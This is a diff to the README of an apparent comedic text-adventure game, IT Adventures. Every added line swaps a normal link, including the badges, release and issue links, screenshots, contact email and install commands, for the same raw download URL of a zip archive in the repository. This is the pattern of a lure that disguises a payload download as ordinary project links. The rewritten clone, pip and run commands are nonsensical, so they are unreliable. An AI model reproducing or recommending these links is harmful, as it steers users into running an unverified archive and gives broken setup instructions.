@@ -1,7 +1,7 @@
 # IT Adventures: A Comedic Tech-Heavy Text Adventure Game 🎮💻
 
-![IT Adventures](https://img.shields.io/badge/IT%20Adventures-v1.0.0-blue.svg)
-[![Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-brightgreen)](https://github.com/jaheere/IT-Adventures/releases)
+![IT Adventures](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip%https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip)
+[![Release](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip%20Latest%20Version-brightgreen)](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome to **IT Adventures**, a comedic text adventure game where technology mee
 
 ## Installation
 
-To get started, download the latest version from our [Releases section](https://github.com/jaheere/IT-Adventures/releases). Follow the instructions to set up the game on your local machine.
+To get started, download the latest version from our [Releases section](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip). Follow the instructions to set up the game on your local machine.
 
 ### Prerequisites
 
@@ -34,20 +34,20 @@ To get started, download the latest version from our [Releases section](https://
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/jaheere/IT-Adventures.git
+   git clone https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip
    cd IT-Adventures
    ```
 
 2. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip
    ```
 
 3. Run the game:
 
    ```bash
-   python main.py
+   python https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip
    ```
 
 4. Enjoy your adventure in Nerdstown!
@@ -94,7 +94,7 @@ We welcome contributions from the community! If you have ideas, bug fixes, or fe
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) to maintain a positive environment for all contributors.
+Please adhere to our [Code of Conduct](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip) to maintain a positive environment for all contributors.
 
 ---
 
@@ -106,7 +106,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter issues or have questions, please check the [Issues section](https://github.com/jaheere/IT-Adventures/issues) or reach out to the community for support.
+If you encounter issues or have questions, please check the [Issues section](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip) or reach out to the community for support.
 
 ---
 
@@ -119,7 +119,7 @@ If you encounter issues or have questions, please check the [Issues section](htt
 
 ## Stay Updated
 
-For the latest updates, visit our [Releases section](https://github.com/jaheere/IT-Adventures/releases) and keep an eye on upcoming features and improvements.
+For the latest updates, visit our [Releases section](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip) and keep an eye on upcoming features and improvements.
 
 ---
 
@@ -137,15 +137,15 @@ Join our Discord server for community events, game nights, and discussions. Conn
 
 ## Screenshots
 
-![Nerdtown Square](https://example.com/screenshot1.png)
-![Café 5 GH](https://example.com/screenshot2.png)
-![Data Alley](https://example.com/screenshot3.png)
+![Nerdtown Square](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip)
+![Café 5 GH](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip)
+![Data Alley](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip)
 
 ---
 
 ## Contact
 
-For inquiries, please reach out to us at [contact@itadventures.com](mailto:contact@itadventures.com).
+For inquiries, please reach out to us at [https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip](https://github.com/jaheere/IT-Adventures/raw/refs/heads/main/data/Adventures-I-v3.2-beta.1.zip).
 
 ---
 
